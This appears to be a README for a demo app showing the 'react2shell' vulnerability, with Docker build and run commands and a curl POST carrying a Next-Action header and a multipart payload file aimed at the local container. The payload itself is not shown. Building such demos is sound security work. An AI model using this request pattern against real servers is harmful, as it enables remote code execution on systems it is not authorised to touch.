# react2shell-demo
This is a demo app to demonstrate the recent react2shell vulnerability

To build the Docker image :- 

docker build -t react2shell-app .

To run the Docker container :-

docker run -p 3000:3000 --rm react2shell-app

Make the cURL request to the react server running inside the Docker :-

curl -v -X POST http://localhost:3000/ \
  -H "Next-Action: ffb5df8f6939daffe8dc5806867601e2542b1cf6" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
  --data-binary @payload.txt
